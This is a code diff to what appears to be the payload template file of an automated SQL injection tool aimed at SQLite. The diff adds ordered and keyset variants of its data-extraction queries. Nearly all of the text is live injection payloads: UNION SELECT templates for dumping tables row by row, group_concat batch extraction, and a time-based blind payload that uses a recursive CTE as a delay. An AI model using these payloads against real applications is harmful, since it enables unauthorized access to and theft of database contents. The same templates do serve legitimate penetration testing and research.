@@ -3,6 +3,8 @@ exists_column: exists(select {cols} from {table})
 UnionFillStr:1
 UnionAll:1=2 union all select {cols}
 UnionData:1=2 union all select {cols} from {table}{where} limit 1 offset {rowIndex}
+UnionDataOrdered:1=2 union all select {cols} from {table}{where} order by {stableKey} limit 1 offset {rowIndex}
+UnionDataKeyset:1=2 union all select {cols} from {table}{where} order by {stableKey} limit 1
 UnionDataRows:1=2 union all select {fill} from (select group_concat(sqli_r,'') sqli_agg from (select {cols} sqli_r from {table}{where} limit {batchSize} offset {rowIndex}) sqli_t) sqli_x
 BoolData:{expr}>{value}
 DataSplitStr:_s_p_
@@ -26,6 +28,8 @@ Ascii:unicode({expr})
 Hex:hex({expr})
 SleepBoolData: (select case when ({cond}) then (with recursive cte_stk(x) as (select 1 union all select x+1 from cte_stk where x<{sleep}0000000) select count(*) from cte_stk) else 1 end)
 DataValue:(select {cols} from {table}{where} limit 1 offset {rowIndex})
+DataValueOrdered:(select {cols} from {table}{where} order by {stableKey} limit 1 offset {rowIndex})
+DataValueKeyset:(select {cols} from {table}{where} order by {stableKey} limit 1)
 DataCount:(select count(1) from {table}{where})
 BlindStrategy: codepoint
 DnsChannel: no
